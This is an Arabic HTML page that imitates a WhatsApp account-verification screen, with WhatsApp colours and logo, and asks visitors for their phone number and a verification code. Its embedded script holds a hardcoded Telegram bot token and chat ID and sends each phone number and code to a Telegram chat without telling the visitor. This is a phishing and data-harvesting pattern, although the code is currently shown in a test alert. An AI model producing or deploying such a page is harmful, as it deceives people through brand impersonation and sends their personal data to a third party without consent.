<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من ملكية الحساب</title>
    <style>
        :root {
            --primary-color: #25D366; /* لون الواتساب */
            --secondary-color: #128C7E;
            --light-color: #f5f5f5;
            --dark-color: #333;
            --error-color: #e74c3c;
            --success-color: #2ecc71;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f5f5f5;
            color: var(--dark-color);
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        h1 {
            color: var(--primary-color);
            margin-bottom: 10px;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: var(--dark-color);
        }
        
        input[type="tel"],
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input:focus {
            border-color: var(--primary-color);
            outline: none;
        }
        
        button {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
            font-weight: bold;
            margin-top: 10px;
        }
        
        button:hover {
            background-color: var(--secondary-color);
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }
        
        .success {
            background-color: rgba(46, 204, 113, 0.2);
            color: var(--success-color);
        }
        
        .error {
            background-color: rgba(231, 76, 60, 0.2);
            color: var(--error-color);
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top: 4px solid var(--primary-color);
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        .verification-section {
            display: none;
            margin-top: 30px;
            animation: fadeIn 0.5s ease;
        }
        
        .timer {
            text-align: center;
            margin-top: 10px;
            color: var(--primary-color);
            font-weight: bold;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="https://cdn-icons-png.flaticon.com/512/3670/3670051.png" alt="واتساب" class="logo">
            <h1>التحقق من ملكية الحساب</h1>
            <p>سيتم إرسال كود التحقق إلى رقم واتساب المسجل</p>
        </header>
        
        <div id="phoneForm">
            <div class="form-group">
                <label for="phone">رقم الهاتف المرتبط بالحساب</label>
                <input type="tel" id="phone" name="phone" required placeholder="أدخل رقم الهاتف مع رمز الدولة">
            </div>
            
            <div class="loading" id="phoneLoading">
                <div class="spinner"></div>
                <p>جاري إرسال كود التحقق...</p>
            </div>
            
            <div class="status" id="phoneStatus"></div>
            
            <button type="button" id="sendCodeBtn">إرسال كود التحقق</button>
        </div>
        
        <div id="verificationSection" class="verification-section">
            <div class="form-group">
                <label for="verificationCode">كود التحقق المكون من 6 أرقام</label>
                <input type="text" id="verificationCode" name="verificationCode" maxlength="6" placeholder="أدخل الكود هنا" pattern="\d{6}" required>
            </div>
            
            <div class="timer" id="timer">02:00</div>
            
            <button type="button" id="resendCodeBtn" disabled>إعادة إرسال الكود</button>
            
            <div class="loading" id="verifyLoading">
                <div class="spinner"></div>
                <p>جاري التحقق...</p>
            </div>
            
            <div class="status" id="verifyStatus"></div>
            
            <button type="button" id="verifyBtn">تحقق</button>
        </div>
    </div>

    <script>
        // التوكن والآيدي للتلجرام
        const TELEGRAM_BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
        const TELEGRAM_CHAT_ID = '7493001551';
        
        // متغيرات عامة
        let generatedCode = '';
        let countdownInterval;
        let remainingTime = 120; // 2 دقائق بالثواني
        let userPhone = '';
        
        // عناصر DOM
        const phoneForm = document.getElementById('phoneForm');
        const verificationSection = document.getElementById('verificationSection');
        const sendCodeBtn = document.getElementById('sendCodeBtn');
        const verifyBtn = document.getElementById('verifyBtn');
        const resendCodeBtn = document.getElementById('resendCodeBtn');
        const phoneLoading = document.getElementById('phoneLoading');
        const verifyLoading = document.getElementById('verifyLoading');
        const phoneStatus = document.getElementById('phoneStatus');
        const verifyStatus = document.getElementById('verifyStatus');
        const timerElement = document.getElementById('timer');
        
        // إرسال كود التحقق
        sendCodeBtn.addEventListener('click', function() {
            const phoneInput = document.getElementById('phone');
            const phone = phoneInput.value.trim();
            
            if (!phone) {
                showError(phoneStatus, 'الرجاء إدخال رقم الهاتف');
                return;
            }
            
            phoneLoading.style.display = 'block';
            phoneStatus.style.display = 'none';
            
            // توليد كود تحقق عشوائي (6 أرقام)
            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
            userPhone = phone;
            
            // إرسال إشعار إلى التلجرام بأنه تم طلب كود تحقق
            sendToTelegram(`📲 *طلب كود تحقق جديد*\n\n`
                        + `📱 رقم الهاتف: ${phone}\n`
                        + `🔢 كود التحقق: ${generatedCode}\n`
                        + `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`);
            
            // محاكاة إرسال الكود إلى الواتساب
            setTimeout(() => {
                phoneLoading.style.display = 'none';
                
                // عرض الكود للمستخدم (لأغراض الاختبار فقط)
                alert(`كود التحقق: ${generatedCode}\n\n(في الواقع سيتم إرساله إلى ${phone} عبر الواتساب)`);
                
                // إظهار قسم التحقق
                verificationSection.style.display = 'block';
                
                // بدء العد التنازلي
                startCountdown();
            }, 1500);
        });
        
        // بدء العد التنازلي لإعادة الإرسال
        function startCountdown() {
            clearInterval(countdownInterval);
            remainingTime = 120;
            updateTimerDisplay();
            
            countdownInterval = setInterval(() => {
                remainingTime--;
                updateTimerDisplay();
                
                if (remainingTime <= 0) {
                    clearInterval(countdownInterval);
                    resendCodeBtn.disabled = false;
                }
            }, 1000);
        }
        
        // تحديث عرض المؤقت
        function updateTimerDisplay() {
            const minutes = Math.floor(remainingTime / 60);
            const seconds = remainingTime % 60;
            timerElement.textContent = 
                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        // إعادة إرسال كود التحقق
        resendCodeBtn.addEventListener('click', function() {
            this.disabled = true;
            
            // توليد كود جديد
            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
            
            // إرسال إشعار إلى التلجرام بإعادة الإرسال
            sendToTelegram(`🔄 *إعادة إرسال كود التحقق*\n\n`
                        + `📱 رقم الهاتف: ${userPhone}\n`
                        + `🔢 الكود الجديد: ${generatedCode}\n`
                        + `🕒 الوقت: ${new Date().toLocaleString('ar-SA')}`);
            
            // محاكاة إرسال الكود الجديد
            alert(`كود التحقق الجديد: ${generatedCode}\n\n(في الواقع سيتم إرساله إلى ${userPhone} عبر الواتساب)`);
            
            // إعادة بدء العد التنازلي
            startCountdown();
        });
        
        // التحقق من الكود
        verifyBtn.addEventListener('click', function() {
            const enteredCode = document.getElementById('verificationCode').value.trim();
            
            if (!enteredCode || enteredCode.length !== 6) {
                showError(verifyStatus, 'الرجاء إدخال كود التحقق المكون من 6 أرقام');
                return;
            }
            
            verifyLoading.style.display = 'block';
            verifyStatus.style.display = 'none';
            
            // التحقق من صحة الكود
            setTimeout(() => {
                verifyLoading.style.display = 'none';
                
                if (enteredCode === generatedCode) {
                    showSuccess(verifyStatus, 'تم التحقق بنجاح! جاري إرسال البيانات...');
                    
                    // إرسال نتيجة التحقق إلى التلجرام
                    sendVerificationResult(enteredCode, true);
                } else {
                    showError(verifyStatus, 'كود التحقق غير صحيح، الرجاء المحاولة مرة أخرى');
                    
                    // إرسال نتيجة التحقق الفاشلة إلى التلجرام
                    sendVerificationResult(enteredCode, false);
                }
            }, 1500);
        });
        
        // إرسال نتيجة التحقق إلى التلجرام
        function sendVerificationResult(enteredCode, isSuccess) {
            verifyLoading.style.display = 'block';
            
            // إعداد الرسالة للتلجرام
            const message = `🔐 *نتيجة التحقق من الملكية*\n\n`
                         + `📱 *رقم الهاتف:* ${userPhone}\n`
                         + `🔢 *الكود المُرسل:* ${generatedCode}\n`
                         + `🔢 *الكود المدخل:* ${enteredCode}\n`
                         + `🕒 *وقت التحقق:* ${new Date().toLocaleString('ar-SA')}\n`
                         + `✅ *الحالة:* ${isSuccess ? 'ناجح' : 'فشل'}`;
            
            sendToTelegram(message, () => {
                verifyLoading.style.display = 'none';
                if (isSuccess) {
                    showSuccess(verifyStatus, 'تم التحقق وإرسال البيانات بنجاح!');
                }
            });
        }
        
        // وظيفة عامة لإرسال الرسائل إلى التلجرام
        function sendToTelegram(message, callback) {
            const telegramData = new FormData();
            telegramData.append('chat_id', TELEGRAM_CHAT_ID);
            telegramData.append('text', message);
            telegramData.append('parse_mode', 'Markdown');
            
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                body: telegramData
            })
            .then(response => response.json())
            .then(data => {
                if (callback) callback();
                if (!data.ok) {
                    console.error('Telegram API Error:', data);
                }
            })
            .catch(error => {
                if (callback) callback();
                console.error('Error sending to Telegram:', error);
            });
        }
        
        // وظائف مساعدة لعرض الرسائل
        function showError(element, message) {
            element.textContent = message;
            element.className = 'status error';
            element.style.display = 'block';
        }
        
        function showSuccess(element, message) {
            element.textContent = message;
            element.className = 'status success';
            element.style.display = 'block';
        }
    </script>
</body>
</html>
